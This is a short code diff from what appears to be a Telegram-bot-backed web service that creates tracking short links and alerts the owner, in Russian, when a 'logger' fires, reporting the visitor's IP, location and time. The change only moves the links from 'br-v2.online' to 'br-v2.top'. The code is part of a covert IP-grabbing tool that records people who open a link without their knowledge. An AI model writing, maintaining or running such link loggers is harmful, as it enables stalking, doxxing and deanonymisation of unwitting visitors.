@@ -124,7 +124,7 @@ async def _notify_owner(owner_id: int, short_id: str, ip: str, ua: str,
 
     text = (
         f"🎯 *Логгер сработал!*\n\n"
-        f"🔑 *Ссылка:* `br-v2.online/{short_id}`\n\n"
+        f"🔑 *Ссылка:* `br-v2.top/{short_id}`\n\n"
         f"🕐 *Время:* `{now_str}`\n"
         f"🌐 *IP:* `{ip}`\n"
         f"🏳 *Локация:* `{location}`\n"
@@ -156,7 +156,7 @@ async def create_link(owner_id: int, token: str = ""):
     """Внутренний endpoint — вызывается ботом для создания ссылки."""
     short_id = _generate_id()
     _links[short_id] = (owner_id, token)
-    return {"short_id": short_id, "url": f"https://br-v2.online/{short_id}"}
+    return {"short_id": short_id, "url": f"https://br-v2.top/{short_id}"}
 
 
 @app.get("/")
